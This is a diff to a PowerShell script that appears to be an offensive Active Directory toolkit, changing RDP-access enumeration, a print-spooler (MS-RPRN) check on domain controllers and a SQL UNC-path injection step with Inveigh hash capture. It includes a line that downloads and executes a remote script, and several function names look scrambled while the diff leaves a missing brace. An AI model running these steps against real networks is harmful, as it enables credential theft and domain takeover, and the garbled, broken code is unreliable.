@@ -1028,14 +1028,14 @@ function domainreconmodules
             $DomainPolicy.SystemAccess >> "$currentPath\DomainRecon\Passwordpolicy.txt"
 	        
             Write-Host -ForegroundColor Yellow 'Searching for Systems we have RDP access to..'
-	        rewires -LocalGroup RDP -Identity $env:Username  >> "$currentPath\DomainRecon\RDPAccess_Systems.txt" 
+	        rewires -LocalGroup RDP -Identity $env:Username -domain $domain  >> "$currentPath\DomainRecon\RDPAccess_Systems.txt" 
 	        }
             
             function spoolvulnscan{
             
 	    	        Write-Host -ForegroundColor Yellow 'Checking Domain Controllers for MS-RPRN RPC-Service! If its available, you can nearly do DCSync.' #https://www.slideshare.net/harmj0y/derbycon-the-unintended-risks-of-trusting-active-directory
                     iex (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/SecureThisShit/SpoolerScanner/master/SpoolerScan.ps1')
-                    $domcontrols = terracing
+                    $domcontrols = spinster
                     foreach ($domc in $domcontrols.IPAddress)
                     {
 		    	try{
@@ -1222,12 +1222,12 @@ function powerSQL
         if ($responder -eq "yes" -or $responder -eq "y" -or $responder -eq "Yes" -or $responder -eq "Y")
         {
             $smbip = Read-Host -Prompt 'Please enter the IP-Address of the hash capturing Network Interface:'
+	    Invoke-SQLUncPathInjection -Verbose -CaptureIp $smbip
         }
         else
         {
             $smbip = Get-currentIP
             Inveigh
-        }
 	    Invoke-SQLUncPathInjection -Verbose -CaptureIp $smbip.IPv4Address.IPAddress    
 	}
     # XP_Cmdshell functions follow - maybe.
